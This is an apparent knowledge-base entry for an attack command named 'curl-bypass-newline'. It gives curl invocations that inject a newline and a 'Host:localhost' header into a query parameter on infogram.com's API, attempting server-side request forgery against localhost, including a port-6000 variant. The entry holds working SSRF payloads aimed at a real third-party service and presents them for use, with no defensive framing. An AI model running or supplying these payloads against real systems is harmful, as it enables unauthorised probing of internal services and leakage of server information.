---
id: cmd-uuid-3
data: 'curl "https://infogram.com/api/web_resource/url?q=\\nHost:localhost"'
tags:
  - bypass
  - injection
  - ssrf
type: command
output: HTTP/1.1 500 Internal Server Error\nError details...
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:18.644Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-newline

## Command

```bash
curl "https://infogram.com/api/web_resource/url?q=\\nHost:localhost"
```

## Description

Tests SSRF bypass using newline injection to alter request headers and target localhost.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | API endpoint with injected q | Yes |
| `q` | Payload with \nHost:localhost | Yes |

## Examples

### Basic Usage

```bash
curl "https://infogram.com/api/web_resource/url?q=\\nHost:localhost"
```

### Advanced Usage

```bash
curl -v "https://infogram.com/api/web_resource/url?q=\\nHost:localhost:6000"
```

## Expected Output

500 error response potentially leaking server information.

## Related

- [[commands/curl-bypass-hex-ip]]
